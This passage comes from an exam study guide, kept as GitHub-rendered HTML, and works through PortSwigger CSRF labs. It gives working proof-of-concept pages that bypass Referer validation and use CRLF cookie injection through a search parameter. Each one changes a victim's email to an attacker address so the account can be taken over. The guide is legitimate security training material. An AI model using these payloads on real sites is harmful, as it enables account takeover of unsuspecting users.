\u003cstrong\u003e\"referrer\"\u003c/strong\u003e must be spelled correctly in the above \u003ccode\u003ehead\u003c/code\u003e section of the exploit server.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/referer-csrf.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/referer-csrf.png\" alt=\"Referer csrf\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCreate a CSRF proof of concept exploit and host it on the exploit server. Edit the JavaScript so that the third argument of the \u003cstrong\u003ehistory.pushState()\u003c/strong\u003e function includes a query string with target URL.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;html\u0026gt;\n  \u0026lt;!-- CSRF PoC -  CSRF with broken Referer validation --\u0026gt;\n  \u0026lt;body\u0026gt;\n\t\u0026lt;script\u0026gt;\n\t\thistory.pushState('', '', '/?TARGET.net');\n\t\u0026lt;/script\u0026gt;\n    \u0026lt;form action=\u0026quot;https://TARGET.net/my-account/change-email\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt;\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;email\u0026quot; value=\u0026quot;hacker\u0026amp;#64;exploit\u0026amp;#45;net\u0026quot; /\u0026gt;\n      \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Submit request\u0026quot; /\u0026gt;\n    \u0026lt;/form\u0026gt;\n    \u0026lt;script\u0026gt;\n      document.forms[0].submit();\n    \u0026lt;/script\u0026gt;\n  \u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ehtml\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"pl-c\"\u003e\u0026lt;!-- CSRF PoC -  CSRF with broken Referer validation --\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ebody\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\t\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\t\t\u003cspan class=\"pl-s1\"\u003ehistory\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003epushState\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e''\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e''\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'/?TARGET.net'\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\t\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eform\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eaction\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://TARGET.net/my-account/change-email\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003emethod\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ePOST\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etype\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehidden\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003ename\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003eemail\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003evalue\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehacker\u0026amp;#64;exploit\u0026amp;#45;net\u003c/span\u003e\" \u003cspan class=\"pl-kos\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etype\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003esubmit\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003evalue\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003eSubmit request\u003c/span\u003e\" \u003cspan class=\"pl-kos\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eform\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eforms\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e[\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e]\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003esubmit\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ebody\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ehtml\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eWhen above exploit payload is delivered to victim, the CSRF POC payload changes the victim email to \u003cstrong\u003e\u003ca href=\"mailto:hacker@exploit.net\"\u003ehacker@exploit.net\u003c/a\u003e\u003c/strong\u003e, because the Referer header contained target in value. In \u003cem\u003e\u003cstrong\u003eBSCP\u003c/strong\u003e\u003c/em\u003e exam take not of your \u003ccode\u003ehacker@exploit\u003c/code\u003e server email address to use in account takeover.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken\" rel=\"nofollow\"\u003ePortSwigger Lab: CSRF with broken Referer validation\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eReferer Header Present\u003c/h3\u003e\u003ca id=\"user-content-referer-header-present\" class=\"anchor\" aria-label=\"Permalink: Referer Header Present\" href=\"#referer-header-present\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn the update email request when changing the \u003ccode\u003ereferer\u003c/code\u003e header the response indicate \u003ccode\u003eInvalid referer header\u003c/code\u003e, \u003cem\u003e\u003cstrong\u003eidentifying\u003c/strong\u003e\u003c/em\u003e CSRF vulnerability. Using the \u003ccode\u003e\u0026lt;meta name=\"referrer\" content=\"no-referrer\"\u0026gt;\u003c/code\u003e as part of the exploit server CSRF PoC this control can be bypassed. This instruct the exploit server to Deliver Exploit to victim without \u003ccode\u003ereferer\u003c/code\u003e header.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;html\u0026gt;\n  \u0026lt;!-- CSRF PoC - CSRF where Referer validation depends on header being present --\u0026gt;\n  \u0026lt;body\u0026gt;\n\u0026lt;meta name=\u0026quot;referrer\u0026quot; content=\u0026quot;no-referrer\u0026quot;\u0026gt;\n    \u0026lt;form action=\u0026quot;https://TARGET.net/my-account/change-email\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt;\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;email\u0026quot; value=\u0026quot;administrator\u0026amp;#64;EXPLOIT\u0026amp;#46;NET\u0026quot; /\u0026gt;\n      \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Submit request\u0026quot; /\u0026gt;\n    \u0026lt;/form\u0026gt;\n    \u0026lt;script\u0026gt;\nhistory.pushState('', '', '/');\n      document.forms[0].submit();\n    \u0026lt;/script\u0026gt;\n  \u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ehtml\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"pl-c\"\u003e\u0026lt;!-- CSRF PoC - CSRF where Referer validation depends on header being present --\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ebody\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003emeta\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ename\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ereferrer\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003econtent\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003eno-referrer\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eform\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eaction\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://TARGET.net/my-account/change-email\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003emethod\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ePOST\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etype\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehidden\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003ename\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003eemail\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003evalue\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003eadministrator\u0026amp;#64;EXPLOIT\u0026amp;#46;NET\u003c/span\u003e\" \u003cspan class=\"pl-kos\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etype\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003esubmit\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003evalue\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003eSubmit request\u003c/span\u003e\" \u003cspan class=\"pl-kos\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eform\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003ehistory\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003epushState\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e''\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e''\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'/'\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n      \u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eforms\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e[\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e]\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003esubmit\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ebody\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ehtml\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThis is interactive exploit and in BSCP exam if the stage 1 exploit was non interactive then this can be used to obtain administrator interaction by her clicking on the link to change their password. Note to check the \u003ccode\u003esource code\u003c/code\u003e of the change email page for any additional form id values.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf-referer-present.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf-referer-present.png\" alt=\"csrf referer present\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present\" rel=\"nofollow\"\u003ePortSwigger Lab: CSRF where Referer validation depends on header being present\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eLastSearchTerm\u003c/h3\u003e\u003ca id=\"user-content-lastsearchterm\" class=\"anchor\" aria-label=\"Permalink: LastSearchTerm\" href=\"#lastsearchterm\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e the CSRF vulnerability where token not tied to non-session cookie, by changing the \u003cstrong\u003ecsrfkey\u003c/strong\u003e cookie and seeing the result that the request is rejected. Observe the \u003cstrong\u003eLastSearchTerm\u003c/strong\u003e cookie value containing the user supplied input from the search parameter.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-csrf-non-session-tied.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-csrf-non-session-tied.png\" alt=\"identify-csrf-non-session-tied.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSearch function has no CSRF protection, create below payload that injects new line characters \u003ccode\u003e%0d%0a\u003c/code\u003e to set new cookie value in response, and use this to inject cookies into the victim user's browser.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"/?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e/?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eGenerate CSRF POC, Enable the option to include an \u003cstrong\u003eauto-submit\u003c/strong\u003e script and click \u003cstrong\u003eRegenerate\u003c/strong\u003e. Remove the \u003cstrong\u003eauto-submit\u003c/strong\u003e script code block and add following instead, and place \u003ccode\u003ehistory.pushState\u003c/code\u003e script code below body header. The \u003cstrong\u003eonerror\u003c/strong\u003e of the IMG SRC tag will instead submit the CSRF POC.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\u0026lt;img src=\u0026quot;https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None\u0026quot; onerror=\u0026quot;document.forms[0].submit()\u0026quot;\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\u0026lt;img src=\"https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None\" onerror=\"document.forms[0].submit()\"\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eDuring BSCP \u003cstrong\u003eExam\u003c/strong\u003e set the email change value to that of the exploit server \u003cem\u003e\u003cstrong\u003e\u003ca href=\"mailto:hacker@exploit-server.net\"\u003ehacker@exploit-server.net\u003c/a\u003e\u003c/strong\u003e\u003c/em\u003e email address. Then you can change the administrator password with the reset function.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf-set-cookie-poc.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf-set-cookie-poc.png\" alt=\"csrf set cookie poc\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn the below CSRF PoC code, the hidden csrf value is the one generated by the \u003cstrong\u003echange email\u003c/strong\u003e function and the csrfkey value in the \u003ccode\u003eimg src\u003c/code\u003e is the value of the victim, obtained by logging on as victim provided credentials. not sure in exam but real world this is test to be performed.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;html\u0026gt;\n  \u0026lt;body\u0026gt;\n    \u0026lt;script\u0026gt;history.pushState('', '', '/')\u0026lt;/script\u0026gt;\n    \u0026lt;form action=\u0026quot;https://TARGET.net/my-account/change-email\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt;\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;email\u0026quot; value=\u0026quot;hacker\u0026amp;#64;exploit\u0026amp;#45;0a18002e03379f0ccf16180f01180022\u0026amp;#46;exploit\u0026amp;#45;server\u0026amp;#46;net\u0026quot; /\u0026gt;\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;csrf\u0026quot; value=\u0026quot;48hizVRa9oJ1slhOIPljozUAjqDMdplb\u0026quot; /\u0026gt;\n      \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Submit request\u0026quot; /\u0026gt;\n    \u0026lt;/form\u0026gt;\n\t\u0026lt;img src=\u0026quot;https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrfKey=NvKm20fiUCAySRSHHSgH7hwonb21oVUZ%3b%20SameSite=None\u0026quot; onerror=\u0026quot;document.forms[0].submit()\u0026quot;\u0026gt;    \n  \u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ehtml\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ebody\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003ehistory\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003epushState\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e''\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e''\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'/'\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eform\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eaction\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://TARGET.net/my-account/change-email\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003emethod\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ePOST\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etype\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehidden\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003ename\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003eemail\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003evalue\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehacker\u0026amp;#64;exploit\u0026amp;#45;0a18002e03379f0ccf16180f01180022\u0026amp;#46;exploit\u0026amp;#45;server\u0026amp;#46;net\u003c/span\u003e\" \u003cspan class=\"pl-kos\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etype\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehidden\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003ename\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ecsrf\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003evalue\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003e48hizVRa9oJ1slhOIPljozUAjqDMdplb\u003c/span\u003e\" \u003cspan class=\"pl-kos\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etype\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003esubmit\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003evalue\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003eSubmit request\u003c/span\u003e\" \u003cspan class=\"pl-kos\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eform\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\t\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eimg\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrfKey=NvKm20fiUCAySRSHHSgH7hwonb21oVUZ%3b%20SameSite=None\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003eonerror\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003edocument.forms[0].submit()\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e    \n  \u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan 